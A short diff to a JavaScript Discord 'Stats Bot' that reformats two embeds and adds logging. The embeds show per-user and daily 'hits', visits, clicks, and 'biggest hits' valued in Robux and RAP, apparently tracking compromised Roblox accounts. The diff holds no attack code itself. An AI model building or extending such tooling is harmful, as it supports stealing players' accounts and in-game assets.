@@ -74,27 +74,28 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x000000) // negru
+        .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
-        .setDescription(`─── <a:shine:1434729237545222287> NORMAL INFO <a:shine:1434729237545222287> ───
+        .setDescription(`─── <a:shine:1434729237545222287> **NORMAL INFO** <a:shine:1434729237545222287> ───
 
-<:dot:1434739765240135811> User: ${userName}
+<:dot:1434739765240135811> **Command by:** ${message.author.username}
+<:dot:1434739765240135811> **Target:** ${userName}
 
-<:dot:1434739765240135811> TOTAL STATS:
+<:dot:1434739765240135811> **TOTAL STATS:**
 \`\`\`
 Hits:     ${formatNumber(hits)}
 Visits:   ${formatNumber(visits)}
 Clicks:   ${formatNumber(clicks)}
 \`\`\`
 
-<:dot:1434739765240135811> BIGGEST HITS:
+<:dot:1434739765240135811> **BIGGEST HITS:**
 \`\`\`
 Summary:  ${formatNumber(biggestSummary)}
 RAP:      ${formatNumber(biggestRap)}
 Robux:    ${formatNumber(biggestRobux)}
 \`\`\`
 
-<:dot:1434739765240135811> TOTAL HIT STATS:
+<:dot:1434739765240135811> **TOTAL HIT STATS:**
 \`\`\`
 Summary:  ${formatNumber(totalSummary)}
 RAP:      ${formatNumber(totalRap)}
@@ -103,6 +104,7 @@ Robux:    ${formatNumber(totalRobux)}
         .setImage("https://i.pinimg.com/originals/67/b1/ef/67b1ef05eb08b416b90323b73e6cf1c5.gif")
         .setFooter({ text: "Stats Bot" });
 
+      console.log(`📤 Sending stats embed for ${userName}`);
       await message.channel.send({ embeds: [embed] });
 
     } catch (err) {
@@ -145,18 +147,19 @@ Robux:    ${formatNumber(totalRobux)}
       const embed = new EmbedBuilder()
         .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
-        .setDescription(`─── <a:shine:1434729237545222287> DAILY STATS <a:shine:1434729237545222287> ───
+        .setDescription(`─── <a:shine:1434729237545222287> **DAILY STATS** <a:shine:1434729237545222287> ───
 
-<:dot:1434739765240135811> User: ${userName}
+<:dot:1434739765240135811> **Command by:** ${message.author.username}
+<:dot:1434739765240135811> **Target:** ${userName}
 
-<:dot:1434739765240135811> DAILY STATS:
+<:dot:1434739765240135811> **DAILY STATS:**
 \`\`\`
 Hits:     ${formatNumber(dailyHits)}
 Visits:   ${formatNumber(dailyVisits)}
 Clicks:   ${formatNumber(dailyClicks)}
 \`\`\`
 
-<:dot:1434739765240135811> DAILY HIT STATS:
+<:dot:1434739765240135811> **DAILY HIT STATS:**
 \`\`\`
 Summary:  ${formatNumber(dailySummary)}
 RAP:      ${formatNumber(dailyRap)}
@@ -165,6 +168,7 @@ Robux:    ${formatNumber(dailyRobux)}
         .setImage("https://i.pinimg.com/originals/67/b1/ef/67b1ef05eb08b416b90323b73e6cf1c5.gif")
         .setFooter({ text: "Stats Bot Daily" });
 
+      console.log(`📤 Sending daily stats embed for ${userName}`);
       await message.channel.send({ embeds: [embed] });
 
     } catch (err) {
